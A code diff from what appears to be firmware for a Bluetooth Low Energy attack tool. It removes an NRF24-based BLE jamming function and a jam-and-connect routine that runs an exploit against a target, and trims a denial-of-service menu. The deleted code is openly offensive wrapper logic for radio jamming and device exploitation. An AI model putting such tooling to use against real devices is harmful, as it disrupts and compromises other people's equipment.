@@ -7,7 +7,6 @@
 #include "core/utils.h"
 #include "core/wifi/wifi_common.h"
 #include "fastpair_crypto.h"
-#include "modules/NRF24/nrf_jammer_api.h"
 #include <SD.h>
 #include <esp_heap_caps.h>
 #include <globals.h>
@@ -2312,90 +2311,6 @@ bool MultiConnectionAttack::advertisingSpam(std::vector<NimBLEAddress> targets) 
     return true;
 }
 
-bool MultiConnectionAttack::nrf24JamAttack(int jamMode) {
-    AutoCleanup cleanup([]() { BLEStateManager::deinitBLE(true); });
-
-    if (!confirmAttack("Jam BLE frequencies? This may disrupt nearby devices.")) return false;
-    showAttackProgress("Initializing NRF24 for BLE jamming...", TFT_WHITE);
-
-    if (!isNRF24Available()) {
-        showAttackResult(false, "NRF24 module not available");
-        return false;
-    }
-
-    BLEJamMode bleMode;
-    switch (jamMode) {
-        case 0: bleMode = BLE_JAM_ADV_CHANNELS; break;
-        case 1: bleMode = BLE_JAM_HOP_ADV; break;
-        case 2: bleMode = BLE_JAM_HOP_ALL; break;
-        default: bleMode = BLE_JAM_ADV_CHANNELS;
-    }
-
-    showAttackProgress("Starting BLE jamming attack...", TFT_ORANGE);
-    bool success = startBLEJammer(bleMode);
-
-    if (success) {
-        std::vector<String> lines = {
-            "BLE JAMMER ACTIVE",
-            "Mode: " + String(
-                           bleMode == BLE_JAM_ADV_CHANNELS ? "Advertising Channels"
-                           : bleMode == BLE_JAM_HOP_ADV    ? "Hopping Adv Channels"
-                           : bleMode == BLE_JAM_HOP_ALL    ? "Hopping All BLE Channels"
-                                                           : "Unknown"
-                       ),
-            "",
-            "Jamming BLE frequencies",
-            "Press any key to stop..."
-        };
-        showDeviceInfoScreen("BLE JAMMER", lines, TFT_ORANGE, TFT_WHITE);
-        stopBLEJammer();
-        cleanup.disable();
-        showAttackResult(true, "BLE jamming stopped");
-        return true;
-    }
-    showAttackResult(false, "Failed to start BLE jamming");
-    return false;
-}
-
-bool MultiConnectionAttack::jamAndConnect(NimBLEAddress target) {
-    AutoCleanup cleanup([]() { BLEStateManager::deinitBLE(true); });
-
-    if (!confirmAttack("Jam BLE while attempting exploit connection?")) return false;
-    showAttackProgress("Jam & Connect attack starting...", TFT_ORANGE);
-
-    bool jamStarted = jamBLEAdvertisingChannels();
-    if (!jamStarted) {
-        showAttackResult(false, "Failed to start jamming");
-        return false;
-    }
-
-    delay(300);
-    showAttackProgress("Jamming active - attempting connection...", TFT_YELLOW);
-
-    String connectionMethod = "";
-    NimBLEClient *pClient = attemptConnectionWithStrategies(target, connectionMethod);
-    stopBLEJammer();
-    delay(200);
-
-    if (pClient) {
-        BLEStateManager::registerClient(pClient);
-        showAttackProgress("Connected! Testing for exploit...", TFT_GREEN);
-        WhisperPairExploit exploit;
-        bool exploitSuccess = exploit.executeSilent(target);
-
-        pClient->disconnect();
-        BLEStateManager::unregisterClient(pClient);
-        NimBLEDevice::deleteClient(pClient);
-        cleanup.disable();
-
-        if (exploitSuccess) showAttackResult(true, "Jam & Connect exploit successful!");
-        else showAttackResult(true, "Connected but exploit failed");
-        return true;
-    }
-    showAttackResult(false, "Jam & Connect attack failed");
-    return false;
-}
-
 void MultiConnectionAttack::cleanup() {
     for (auto &client : activeConnections) {
         if (client) {
@@ -4415,21 +4330,17 @@ void showMemorySubMenu(NimBLEAddress target) {
 }
 
 void showDoSSubMenu(NimBLEAddress target) {
-    const char *options[] = {
-        "Connection Flood", "Advertising Spam", "Jam & Connect (NRF24)", "Protocol Fuzzer"
-    };
+    const char *options[] = {"Connection Flood", "Advertising Spam", "Protocol Fuzzer"};
 
-    int choice = showSubMenu("DoS Attacks", options, 4);
+    int choice = showSubMenu("DoS Attacks", options, 3);
     if (choice == -1) return;
 
     DoSAttackServiceClass dos;
-    MultiConnectionAttack multi;
 
     switch (choice) {
         case 0: dos.connectionFlood(target); break;
         case 1: dos.advertisingSpam(target); break;
-        case 2: multi.jamAndConnect(target); break;
-        case 3: runProtocolFuzzer(target); break;
+        case 2: runProtocolFuzzer(target); break;
     }
 }
 
